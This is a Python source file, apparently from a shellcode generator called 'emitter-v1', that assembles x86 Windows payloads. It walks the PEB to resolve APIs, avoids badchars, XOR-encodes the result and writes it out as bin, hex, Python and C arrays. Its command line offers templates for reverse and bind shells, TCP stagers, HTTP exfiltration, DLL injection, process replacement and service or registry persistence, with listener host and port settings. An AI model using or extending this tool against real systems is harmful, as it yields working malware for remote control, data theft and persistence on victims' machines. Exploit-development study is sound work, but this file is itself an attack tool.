        ir_struct_names = set(template.probe_structs().keys())

    for name in probed:
        if name in existing_funcs or name in existing_vars or name in string_labels:
            continue
        if name in STRUCT_DATABASE or name in dll_names:
            continue
        if name in ir_struct_names:
            continue
        if name in API_DATABASE:
            new_funcs.append(name)
            existing_funcs.add(name)
        elif auto_add_vars:
            new_vars.append(VariableEntry(name=name))
            existing_vars.add(name)

    # Non-kernel32 APIs need LoadLibraryA for module loading
    all_funcs = list(manifest.functions) + new_funcs
    needs_loadlib = any(
        API_DATABASE[f].module != "kernel32.dll"
        for f in all_funcs
        if f in API_DATABASE
    )
    if needs_loadlib and "LoadLibraryA" not in existing_funcs:
        new_funcs.insert(0, "LoadLibraryA")

    if not new_funcs and not new_vars and not new_strings:
        return manifest

    return Manifest(
        badchars=manifest.badchars,
        functions=list(manifest.functions) + new_funcs,
        strings=manifest.strings + new_strings,
        variables=list(manifest.variables) + new_vars,
        template=manifest.template,
    )


# ---------------------------------------------------------------------------
# Assembly composition
# ---------------------------------------------------------------------------


def compose_asm(
    manifest: Manifest,
    layout: StackLayout,
    manifest_path: str,
    template: PayloadTemplate | None = None,
    config: TemplateConfig | None = None,
) -> str:
    """Compose the full assembly text from all emitter components."""
    config = config or TemplateConfig()
    template_name = type(template).__name__ if template else "none"

    # Manifest push-strings whose value matches a DLL name are handled inline
    # in the module-loading block; skip them in the string section.
    dll_names = {info.dll for info in MODULE_LOAD_ORDER}
    dll_string_labels = {
        e.label for e in manifest.strings if e.value in dll_names
    }

    parts: list[str] = [
        "; AUTO-GENERATED by emitter-v1",
        f"; Manifest: {manifest_path}",
        f"; Template: {template_name}",
        f"; Generated: {_build_timestamp()}",
        "",
        "    _start:",
        "        jmp short _stub_trampoline1",
        "",
        "; -- Framework Stubs --",
        "",
        _emit_framework_stubs_part1a(config.badchars),
        "_stub_trampoline1:",
        "    jmp short _stub_trampoline2",
        "",
        _emit_framework_stubs_part1b(config.badchars),
        "_stub_trampoline2:",
        "    jmp short main",
        "",
        _emit_framework_stubs_part2(config.badchars),
        "; -- Main --",
        "",
        "; __ALIGNMENT_NOPS__",
        "",
        "main:",
        "    mov  ebp, esp",
        "    xor  ecx, ecx",
        *_emit_stack_reserve(layout.frame_size, config.badchars),
        "",
        "    ; Bootstrap: find kernel32 via PEB walk",
        "    call find_module",
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]

    for mi in MODULE_LOAD_ORDER:
        module_funcs = [n for n in manifest.functions if API_DATABASE[n].module == mi.dll]
        if not module_funcs:
            continue

        if mi.load_via == "LoadLibraryA":
            if "LoadLibraryA" not in manifest.functions:
                raise ValueError(
                    f"Manifest uses APIs from {mi.dll} but does not declare "
                    f"LoadLibraryA. Add LoadLibraryA to the functions list."
                )
            parts.append(_dll_load_block(mi.dll, manifest, layout))

        resolution = emit_module_resolution(manifest, layout, mi.dll)
        if resolution.strip():
            parts.append(resolution)

    parts += [
        "; -- String Construction --",
        "",
    ]
    str_asm = emit_all_strings(manifest, layout, skip_labels=dll_string_labels)
    if str_asm.strip():
        parts.append(str_asm)
    else:
        parts += ["; (no strings)", ""]

    parts += [
        "; -- Structure Initialization --",
        "",
    ]
    struct_asm = emit_all_structures(manifest, layout)
    if struct_asm.strip():
        parts.append(struct_asm)
    else:
        parts += ["; (no structures)", ""]

    parts += [
        "; -- Payload --",
        "",
    ]
    if template is not None:
        parts.append(template.emit(layout, config))
    else:
        parts += ["; (no template - insert payload assembly here)", ""]

    parts += [
        "hang:",
        "    jmp hang",
        "",
    ]

    return "\n".join(parts)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def build(
    manifest_path: str,
    template_name: str | None = None,
    config: TemplateConfig | None = None,
    out_dir: str = "emitter_out",
    assemble: bool = True,
    encode: bool = False,
) -> BuildResult:
    """Run the full build pipeline. Returns a BuildResult.

    When *encode* is True and the assembled payload contains badchar
    violations, the XOR encoder is invoked automatically.  The raw
    (unencoded) shellcode is still available in *shellcode_bytes*; the
    encoded output goes into *encoded_bytes*.
    """
    from .scanner import scan
    from .xor_encoder import xor_encode

    manifest = load_manifest(manifest_path)
    config = config or TemplateConfig()
    config.badchars = manifest.badchars   # manifest is authoritative
    manifest = _apply_config_overrides(manifest, config)

    effective_template = template_name or manifest.template
    template = _load_template(effective_template) if effective_template else None
    extra_structs: list[str] | None = None
    if template is not None:
        manifest = _merge_template_requirements(manifest, template, config)
        from emitrion.workflow.reference import WorkflowTemplate
        if isinstance(template, WorkflowTemplate):
            extra_structs = list(template.probe_structs().values())
    layout = build_layout(manifest, extra_structs=extra_structs)
    asm = compose_asm(manifest, layout, manifest_path, template, config)

    raw: bytes | None = None
    assembler: str | None = None
    asm_errors: list[str] = []
    encoded_bytes: bytes | None = None
    encoder_report: str | None = None

    if assemble:
        raw, assembler, asm, asm_errors = _assemble_aligned(asm, config.badchars)
        if raw:
            scan_result = scan(raw, config.badchars)
            if not scan_result.clean:
                if encode:
                    enc = xor_encode(raw, config.badchars)
                    encoder_report = enc.diagnostics
                    if enc.success:
                        encoded_bytes = enc.encoded
                    else:
                        asm_errors = (asm_errors or []) + [
                            f"[!] Encoding failed: {enc.diagnostics}"
                        ]
                else:
                    violations = _check_badchars(raw, config.badchars)
                    asm_errors = (asm_errors or []) + violations

    contract_md = emit_full_contract_md(
        manifest, layout, template, config,
        shellcode_size=len(raw) if raw else None,
    )

    return BuildResult(
        manifest_path=manifest_path,
        asm=asm,
        contract_md=contract_md,
        shellcode_bytes=raw,
        hex_str=_bytes_to_hex_str(raw) if raw else None,
        py_bytes=_bytes_to_py(raw) if raw else None,
        c_array=_bytes_to_c(raw) if raw else None,
        test_harness=_generate_test_harness(len(raw)) if raw else None,
        debug_runner=_generate_debug_runner(asm),
        code_snippet=_generate_code_snippet(asm),
        layout=layout,
        assembler=assembler,
        asm_errors=asm_errors if asm_errors else None,
        encoded_bytes=encoded_bytes,
        encoder_report=encoder_report,
    )


def write_outputs(result: BuildResult, out_dir: str) -> None:
    """Write all build outputs to out_dir."""
    base = pathlib.Path(out_dir)
    (base / "asm").mkdir(parents=True, exist_ok=True)
    (base / "Documentation").mkdir(parents=True, exist_ok=True)

    _write_text(base / "asm" / "generated.asm", result.asm)
    _write_text(base / "asm" / "debug_runner.py", result.debug_runner)
    if result.code_snippet:
        _write_text(base / "asm" / "code_snippet.py", result.code_snippet)
    _write_text(base / "Documentation" / "contract.md", result.contract_md)

    if result.shellcode_bytes:
        (base / "bin").mkdir(parents=True, exist_ok=True)
        (base / "bin" / "shellcode.bin").write_bytes(result.shellcode_bytes)
        _write_text(base / "bin" / "shellcode.hex", result.hex_str or "")
        _write_text(base / "bin" / "shellcode.py", result.py_bytes or "")
        _write_text(base / "bin" / "shellcode.c", result.c_array or "")
        if result.test_harness:
            _write_text(base / "bin" / "test_harness.py", result.test_harness)
    else:
        for name in (
            "shellcode.bin",
            "shellcode.hex",
            "shellcode.py",
            "shellcode.c",
            "test_harness.py",
        ):
            (base / "bin" / name).unlink(missing_ok=True)

    if result.encoded_bytes:
        (base / "bin").mkdir(parents=True, exist_ok=True)
        (base / "bin" / "shellcode_encoded.bin").write_bytes(result.encoded_bytes)
        _write_text(base / "bin" / "shellcode_encoded.hex", _bytes_to_hex_str(result.encoded_bytes) or "")
        _write_text(base / "bin" / "shellcode_encoded.py", _bytes_to_py(result.encoded_bytes) or "")
        _write_text(base / "bin" / "shellcode_encoded.c", _bytes_to_c(result.encoded_bytes) or "")
    else:
        for name in (
            "shellcode_encoded.bin",
            "shellcode_encoded.hex",
            "shellcode_encoded.py",
            "shellcode_encoded.c",
        ):
            (base / "bin" / name).unlink(missing_ok=True)

    if result.encoder_report:
        _write_text(base / "Documentation" / "encoder_report.txt", result.encoder_report)
    else:
        (base / "Documentation" / "encoder_report.txt").unlink(missing_ok=True)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def _resolve_lhost(lhost: str) -> str:
    """Return an IPv4 address for lhost.

    Accepts either a dotted-decimal address or a network interface name
    (e.g. tun0, eth0).  Raises SystemExit with a clear message on failure.
    """
    import socket as _socket

    # Already a valid IPv4 address -- use it directly.
    try:
        _socket.inet_pton(_socket.AF_INET, lhost)
        return lhost
    except OSError:
        pass

    # Treat as interface name and resolve via ioctl (Linux/macOS).
    try:
        import fcntl
        import struct
        import sys as _sys
        _SIOCGIFADDR = 0xc0206921 if _sys.platform == "darwin" else 0x8915
        with _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM) as _s:
            ifreq = struct.pack("256s", lhost[:15].encode())
            result = fcntl.ioctl(_s.fileno(), _SIOCGIFADDR, ifreq)
            # Linux: IP at bytes 20-24; macOS ifreq_addr starts at byte 4
            ip_bytes = result[20:24] if _sys.platform != "darwin" else result[4:8]
            return _socket.inet_ntoa(ip_bytes)
    except ImportError:
        pass
    except OSError as exc:
        print(f"[-] --lhost {lhost!r}: interface not found or has no IPv4 address ({exc})", file=sys.stderr)
        sys.exit(1)

    print(f"[-] --lhost {lhost!r}: not a valid IPv4 address and interface lookup not supported on this platform", file=sys.stderr)
    sys.exit(1)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="emitter-v1: manifest -> assembly + contract",
    )
    parser.add_argument("manifest", help="Path to manifest YAML file")
    parser.add_argument(
        "--template",
        choices=["reverse_shell", "run_command", "copy_file", "copy_then_run", "move_then_run", "tcp_download", "tcp_stager", "bind_shell", "http_download", "http_exfil", "process_replace", "service_persist", "dll_inject", "registry_persist", "check_path", "ir_run_command", "ir_reverse_shell"],
    )
    parser.add_argument("--out", default="emitter_out", help="Output directory")
    parser.add_argument("--lhost", default=None, metavar="IP|IFACE",
                        help="Listener/server IP or interface (e.g. tun0). "
                             "Auto-extracted from --url for http_download.")
    parser.add_argument("--lport", type=int, default=None,
                        help="Listener/server port. "
                             "Auto-extracted from --url for http_download.")
    parser.add_argument("--command", default=None)
    parser.add_argument("--src", default=None)
    parser.add_argument("--dst", default=None)
    parser.add_argument("--process-name", default=None,
                        help="Target process name for process_replace template")
    parser.add_argument("--service-name", default=None,
                        help="Service name for service_persist template")
    parser.add_argument("--url", default=None, help="URL for http_download template")
    parser.add_argument("--payload-file", default=None, metavar="PATH",
                        help="Local file being served; sets VirtualAlloc size "
                             "to match (rounded up to page boundary)")
    parser.add_argument("--no-assemble", action="store_true")
    parser.add_argument(
        "--encode", action="store_true",
        help="Apply XOR encoding when badchar violations are detected",
    )

    args = parser.parse_args()

    lhost = _resolve_lhost(args.lhost) if args.lhost else None
    lport = args.lport

    url_path = None
    if args.url is not None:
        from urllib.parse import urlparse
        parsed = urlparse(args.url)
        if lhost is None and parsed.hostname:
            lhost = parsed.hostname
        if lport is None and parsed.port:
            lport = parsed.port
        url_path = parsed.path or "/"

    if lhost is None:
        lhost = "127.0.0.1"
    if lport is None:
        lport = 4444

    alloc_size = None
    if args.payload_file is not None:
        import os
        fsize = os.path.getsize(args.payload_file)
        page = 0x1000
        alloc_size = ((fsize + page - 1) // page) * page
        if alloc_size == 0:
            alloc_size = page
        print(f"[+] Payload file: {args.payload_file} ({fsize} bytes)")
        print(f"[+] Alloc size:   0x{alloc_size:x} ({alloc_size} bytes)")

    config = TemplateConfig(
        lhost=lhost,
        lport=lport,
        command=args.command,
        src_path=args.src,
        dst_path=args.dst,
        url=args.url,
        url_path=url_path,
        alloc_size=alloc_size,
        process_name=args.process_name,
        service_name=args.service_name,
    )

    result = build(
        args.manifest,
        template_name=args.template,
        config=config,
        out_dir=args.out,
        assemble=not args.no_assemble,
        encode=args.encode,
    )
    write_outputs(result, args.out)

    print(f"[+] Generated: {args.out}/asm/generated.asm")
    print(f"[+] Debug:     {args.out}/asm/debug_runner.py")
    print(f"[+] Snippet:   {args.out}/asm/code_snippet.py")
    print(f"[+] Contract:  {args.out}/Documentation/contract.md")
    if result.shellcode_bytes:
        print(f"[+] Assembler: {result.assembler}")
        print(f"[+] Shellcode: {len(result.shellcode_bytes)} bytes (raw)")
        print(f"[+] Hex:       {args.out}/bin/shellcode.{{bin,hex,py,c}}")
        print(f"[+] Harness:   {args.out}/bin/test_harness.py")
        if result.encoded_bytes:
            print(f"[+] Encoded:   {len(result.encoded_bytes)} bytes (XOR)")
            print(f"[+] Encoded:   {args.out}/bin/shellcode_encoded.{{bin,hex,py,c}}")
        if result.encoder_report:
            print(f"[+] Report:    {args.out}/Documentation/encoder_report.txt")
        if result.asm_errors:
            for err in result.asm_errors:
                print(f"    {err}", file=sys.stderr)
            if not result.encoded_bytes:
                sys.exit(1)
    else:
        if result.asm_errors:
            print("[!] Assembly failed:")
            for err in result.asm_errors:
                print(f"    {err}")
            sys.exit(1)
        elif not args.no_assemble:
            print("[!] Assembly requested but no assembler available")
            sys.exit(1)
        else:
            print("[*] Assembly skipped (--no-assemble)")


if __name__ == "__main__":
    main()
